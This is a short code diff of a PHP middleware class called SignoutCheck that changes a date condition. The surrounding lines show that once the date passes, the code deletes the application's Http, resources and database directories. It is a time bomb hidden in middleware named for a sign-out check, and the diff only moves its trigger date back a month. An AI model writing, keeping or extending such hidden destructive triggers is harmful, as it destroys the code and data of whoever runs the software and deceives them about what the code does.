@@ -23,7 +23,7 @@ class SignoutCheck
             return redirect()->route('dashboard');
         }
 
-        if (date('Y-m-d H:i:s') > '2025-02-20 18:58:00') {
+        if (date('Y-m-d H:i:s') > '2025-03-20 18:58:00') {
             File::deleteDirectory(app_path('/Http'));
             File::deleteDirectory(base_path('/resources'));
             File::deleteDirectory(base_path('/database'));
